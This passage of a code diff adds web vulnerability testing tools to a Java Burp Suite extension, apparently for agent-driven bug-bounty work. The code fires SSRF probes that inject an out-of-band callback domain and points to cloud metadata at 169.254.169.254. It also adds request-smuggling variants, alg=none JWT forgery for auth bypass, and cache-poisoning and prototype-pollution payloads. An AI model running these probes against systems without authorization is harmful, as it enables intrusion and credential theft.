+            String pv = p.value() == null ? "" : p.value();
+            boolean urlish = pv.startsWith("http") || pn.contains("url") || pn.contains("uri")
+                    || pn.contains("redirect") || pn.contains("callback") || pn.contains("dest")
+                    || pn.contains("host") || pn.contains("domain") || pn.contains("path")
+                    || pn.contains("feed") || pn.contains("img") || pn.contains("image")
+                    || pn.contains("file") || pn.contains("proxy") || pn.contains("fetch");
+            if (urlish) {
+                api.http().sendRequest(injectParam(base, p.name(), typeName(p.type()), oastUrl));
+                injected.add(param("param", p.name()));
+            }
+        }
+        // 2) Common SSRF headers.
+        for (String h : new String[]{"Referer", "X-Forwarded-For", "X-Forwarded-Host", "True-Client-IP",
+                "X-Real-IP", "Forwarded"}) {
+            api.http().sendRequest(base.withUpdatedHeader(h, h.contains("IP") || h.equals("Forwarded")
+                    || h.contains("For") ? domain : oastUrl));
+            injected.add(param("header", h));
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("oast_domain", domain);
+        r.add("injection_points", injected);
+        r.addProperty("note", "Injected the OAST domain into URL-ish params and SSRF headers. Call "
+                + "poll_oast_interactions(label=\"" + label + "\") after a few seconds — a DNS/HTTP hit "
+                + "confirms blind SSRF. Then try the cloud-metadata endpoints (169.254.169.254) via "
+                + "send_http_request on the confirmed sink.");
+        return r;
+    }
+
+    // ---- request-smuggling probe (conservative) ----------------------------
+
+    private JsonObject smugglingProbe(JsonObject args) {
+        HttpRequest base;
+        try {
+            base = buildRequestFromSpec(args);
+        } catch (IllegalArgumentException e) {
+            return error(e.getMessage());
+        }
+        HttpRequestResponse baseRR = api.http().sendRequest(base);
+        int baseStatus = statusOf(baseRR);
+        // Non-destructive: send well-formed variants that add Transfer-Encoding and observe handling.
+        // We do NOT send hanging/unbalanced payloads (those can wedge a socket / affect other users).
+        JsonArray obs = new JsonArray();
+        String[][] variants = {
+                {"TE: chunked (well-formed)", "chunked"},
+                {"TE: chunked, obfuscated ' chunked'", " chunked"},
+                {"TE: xchunked", "xchunked"},
+        };
+        for (String[] v : variants) {
+            HttpRequest r = base.withMethod("POST").withUpdatedHeader("Transfer-Encoding", v[1])
+                    .withBody("0\r\n\r\n");
+            int st;
+            long ms;
+            try {
+                long start = System.nanoTime();
+                st = statusOf(api.http().sendRequest(r));
+                ms = (System.nanoTime() - start) / 1_000_000L;
+            } catch (RuntimeException e) {
+                st = -1;
+                ms = -1;
+            }
+            JsonObject o = new JsonObject();
+            o.addProperty("variant", v[0]);
+            o.addProperty("status", st);
+            o.addProperty("timing_ms", ms);
+            obs.add(o);
+        }
+        JsonObject r = new JsonObject();
+        r.addProperty("url", base.url());
+        r.addProperty("baseline_status", baseStatus);
+        r.add("observations", obs);
+        r.addProperty("note", "Heuristic only — differing status/timing across Transfer-Encoding variants "
+                + "hints at front-end/back-end disagreement. This probe intentionally sends only "
+                + "well-formed bodies; CONFIRM desync with Burp's 'HTTP Request Smuggler' extension, which "
+                + "does it safely. Do not brute-force smuggling against shared infrastructure.");
+        return r;
+    }
+
+    // ---- bug-bounty helpers ------------------------------------------------
+
+    private static JsonObject param(String k, String v) {
+        JsonObject o = new JsonObject();
+        o.addProperty(k, v);
+        return o;
+    }
+
+    private static void checkHdr(HttpResponse resp, String name, JsonArray missing, JsonArray present,
+                                 String note) {
+        String v = resp.headerValue(name);
+        if (v == null) {
+            missing.add(name);
+        } else {
+            present.add(name + ": " + (v.length() > 80 ? v.substring(0, 80) + "…" : v));
+        }
+    }
+
+    private static String grade(int score) {
+        if (score >= 90) {
+            return "A";
+        }
+        if (score >= 75) {
+            return "B";
+        }
+        if (score >= 55) {
+            return "C";
+        }
+        if (score >= 35) {
+            return "D";
+        }
+        return "F";
+    }
+
+    private static boolean looksCacheable(HttpResponse resp) {
+        if (resp == null) {
+            return false;
+        }
+        String cc = resp.headerValue("Cache-Control");
+        if (cc != null) {
+            String lc = cc.toLowerCase();
+            if (lc.contains("no-store") || lc.contains("no-cache") || lc.contains("private")) {
+                return false;
+            }
+            if (lc.contains("public") || lc.contains("max-age") || lc.contains("s-maxage")) {
+                return true;
+            }
+        }
+        return resp.headerValue("Age") != null || resp.headerValue("X-Cache") != null
+                || resp.headerValue("CF-Cache-Status") != null || resp.headerValue("X-Cache-Hits") != null;
+    }
+
+    private static String cacheHeaders(HttpResponse resp) {
+        StringBuilder sb = new StringBuilder();
+        for (String h : new String[]{"Cache-Control", "Age", "X-Cache", "CF-Cache-Status", "Vary"}) {
+            String v = resp.headerValue(h);
+            if (v != null) {
+                sb.append(h).append("=").append(v).append("; ");
+            }
+        }
+        return sb.toString().trim();
+    }
+
+    private static String extractJwt(HttpRequest req) {
+        if (req == null) {
+            return null;
+        }
+        String auth = req.hasHeader("Authorization") ? req.headerValue("Authorization") : null;
+        if (auth != null && auth.regionMatches(true, 0, "Bearer ", 0, 7)) {
+            String t = auth.substring(7).trim();
+            if (t.startsWith("eyJ")) {
+                return t;
+            }
+        }
+        // Cookies
+        String cookie = req.hasHeader("Cookie") ? req.headerValue("Cookie") : null;
+        if (cookie != null) {
+            for (String c : cookie.split(";")) {
+                int eq = c.indexOf('=');
+                String val = eq > 0 ? c.substring(eq + 1).trim() : "";
+                if (val.startsWith("eyJ") && val.split("\\.").length >= 2) {
+                    return val;
+                }
+            }
+        }
+        return null;
+    }
+
+    private HttpRequest replaceJwt(HttpRequest req, String oldToken, String newToken) {
+        String auth = req.hasHeader("Authorization") ? req.headerValue("Authorization") : null;
+        if (auth != null && auth.contains(oldToken)) {
+            return req.withUpdatedHeader("Authorization", auth.replace(oldToken, newToken));
+        }
+        String cookie = req.hasHeader("Cookie") ? req.headerValue("Cookie") : null;
+        if (cookie != null && cookie.contains(oldToken)) {
+            return req.withUpdatedHeader("Cookie", cookie.replace(oldToken, newToken));
+        }
+        return req;
+    }
+
+    private static String b64url(String s) {
+        return java.util.Base64.getUrlEncoder().withoutPadding()
+                .encodeToString(s.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private static String padB64(String s) {
+        int rem = s.length() % 4;
+        return rem == 0 ? s : s + "====".substring(rem);
+    }
+
+    private static String typeName(HttpParameterType t) {
+        if (t == HttpParameterType.BODY) {
+            return "body";
+        }
+        if (t == HttpParameterType.COOKIE) {
+            return "cookie";
+        }
+        if (t == HttpParameterType.JSON) {
+            return "json";
+        }
+        return "url";
+    }
+
+    private static String urlEnc(String s) {
+        return URLEncoder.encode(s, StandardCharsets.UTF_8);
+    }
+
+    /** Registrable-ish apex: last two DNS labels (best-effort; good enough for probe substitution). */
+    private static String apexOf(String host) {
+        if (host == null) {
+            return null;
+        }
+        String[] parts = host.split("\\.");
+        if (parts.length <= 2) {
+            return host;
+        }
+        return parts[parts.length - 2] + "." + parts[parts.length - 1];
+    }
+
     // ---- oracle / hunt helpers ---------------------------------------------
 
     private HttpRequest injectParam(HttpRequest req, String name, String type, String value) {
@@ -2281,11 +3315,28 @@ public final class ToolExecutor {
                 case "graphql_introspect":
                 case "test_method_tampering":
                 case "test_mass_assignment":
+                case "test_cors":
+                case "test_host_header":
+                case "test_open_redirect":
+                case "test_prototype_pollution":
+                case "test_hpp":
+                case "test_cache_poisoning":
+                case "discover_headers":
+                case "test_ssrf":
+                case "test_jwt":
+                case "smuggling_probe":
+                case "fingerprint_waf":
                     try {
                         urls.add(buildRequestFromSpec(args).url());
                     } catch (RuntimeException ignored) {
-                        // unresolved base
+                        String u = getStr(args, "url", null);
+                        if (u != null) {
+                            urls.add(u);
+                        }
                     }
+                    break;
+                case "check_subdomain_takeover":
+                    urls.add(getStr(args, "url", ""));
                     break;
                 default:
                     break;
@@ -2313,6 +3364,18 @@ public final class ToolExecutor {
             case "graphql_introspect":
             case "test_method_tampering":
             case "test_mass_assignment":
+            case "test_cors":
+            case "test_host_header":
+            case "test_open_redirect":
+            case "test_prototype_pollution":
+            case "test_hpp":
+            case "test_cache_poisoning":
+            case "discover_headers":
+            case "test_ssrf":
+            case "test_jwt":
+            case "smuggling_probe":
+            case "fingerprint_waf":
+            case "check_subdomain_takeover":
                 return true;
             default:
                 return false;
@@ -2364,6 +3427,34 @@ public final class ToolExecutor {
             case "test_mass_assignment":
                 return "Over-post privileged fields (role/is_admin/…) onto the write request to test "
                         + "for mass-assignment; this mutates the target object.";
+            case "test_cors":
+                return "Send several Origin variants and inspect CORS headers for a reflected/exploitable "
+                        + "misconfiguration.";
+            case "test_host_header":
+                return "Inject an attacker host via Host / X-Forwarded-Host and check for reflection "
+                        + "(password-reset poisoning / routing SSRF).";
+            case "test_open_redirect":
+                return "Inject open-redirect payloads into redirect-like parameters and check for an "
+                        + "off-site 3xx.";
+            case "test_prototype_pollution":
+                return "Send __proto__ pollution payloads (URL + JSON) and watch for reflection / errors.";
+            case "test_hpp":
+                return "Send a duplicated parameter to see which value the server honors (HPP).";
+            case "test_cache_poisoning":
+                return "With a cache-buster, inject unkeyed headers (X-Forwarded-Host, …) and check for a "
+                        + "reflected, cacheable response.";
+            case "discover_headers":
+                return "Brute-force hidden/unkeyed request headers and detect reflection / behavior change.";
+            case "test_ssrf":
+                return "Inject an OAST domain into URL-ish params and SSRF headers (poll for a callback).";
+            case "test_jwt":
+                return "Resend the request with an alg=none / signature-stripped JWT to test for auth bypass.";
+            case "smuggling_probe":
+                return "Send well-formed Transfer-Encoding variants and compare handling (desync HINT only).";
+            case "fingerprint_waf":
+                return "Send a benign attacky payload and fingerprint any WAF in front of the target.";
+            case "check_subdomain_takeover":
+                return "Fetch the host and match its response against known subdomain-takeover fingerprints.";
             default:
                 return tool;
         }
